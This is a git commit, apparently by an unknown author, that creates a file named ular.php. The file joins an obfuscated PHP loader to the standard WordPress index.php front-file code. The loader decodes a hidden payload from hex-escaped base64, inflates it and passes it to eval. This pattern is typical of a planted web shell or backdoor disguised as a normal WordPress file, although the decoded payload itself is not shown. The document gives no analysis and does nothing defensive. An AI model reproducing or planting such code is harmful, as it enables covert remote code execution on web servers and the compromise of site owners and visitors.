0b5aa4ab0e649bbacb9c3939d62d1237602e80df
nyamukbesi <maboktuak21@gmail.com>
2024-10-23 11:58:07 +0700

    Create ular.php

---
+++ ular.php
@@ -0,0 +1,23 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d\x3d\x41XRZS0\x43sE\x417H\x43R\x61D558\x41Xl\x434/TPdLqquXko75njVqF8Lht9O4gwMv\x42FgEeS\x41URujgMKtRwVgYmgEL\x2b/WRSjEEo\x41mXJXg\x62pe7\x63\x42yE8dO2IQzlKH/p4rdNt4WUvWeuUdmL5d0UGmPtTvpT\x61VMWJt/P\x63O\x61D1qh0I6yfVd9OjQOqrrxy\x42Gd\x42xujuTqSuhhZ\x43xYNvGUIoEvK4mfY6M3\x62O0neSY8MY62\x61fUlVyp3TKVkJnGJxgVqu\x62/3INM\x62h\x43O\x2bGJp7p9NPJYYWotQxS2U9u1xwFFsM02M16XWn\x62Yx33\x2bjls9r86W7\x61r8f\x63hs8Ntt1P\x2b91O8ErfzJH9npvSpHylfM3iPv6yXYNSu\x42zdR\x63IgNN\x2bHpGypzV8H0RUostQJxyo/s5\x61/LVjVRnV\x63erWUG\x61ZwYViVhXf\x431mUfMvm1Vh\x2bo\x41lZRKrwrK15yj3YHjlpJvO\x43s7JQW\x42GRjP8jDXphfYYM8L7yxIh9Wd\x41895DEqiL3pl\x43qG44p\x41\x63YQH8l\x41\x63V\x61VxivK7KmRQ3U4kVitP\x62ixS4SL1tSJ14xN\x41YwR\x61gLmWxqeX\x42N414\x2bJZ\x62K1\x41T21SvY\x63TgYmROQ\x63WTgZOFPqFQzp/3rh4nYddEUS\x41\x43O21E\x63kR6SRsE\x62sH3V/Yj\x611j\x43d\x63we0/PQix\x61HNmwpRtgDoQugkW5vf9vRZ/R1T4\x62Fkyj/509xY\x43iS\x43NDmR7MxG\x612yFNTuHDvGP\x42y1I\x43IfJKT\x619yQ90hMMeXsGm1\x63Z4\x621Z8d0M\x2bW07\x41NDljpzgvZM82k6w0J3Dx\x62zP\x43DKzftMPOnTox\x43ee\x62k/h4tpNnIzSK\x2bLuJ\x41r3ruIj\x2bkjdd\x43P33T3\x2bUHgqrzypT9vk8\x2bv0fn\x41X7TVF8\x61LNGriyMIdQy4Y2J5FL1Uo5ohVlY2hgVME/hsH\x2bD\x42M\x62vW\x62U1Z/4Jwh\x42wJe93m\x41SGQ/oJwl\x42wJe93l\x41iGQ/YJwp\x42wJe93k\x41yGQ/IJwt\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+?>
+
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
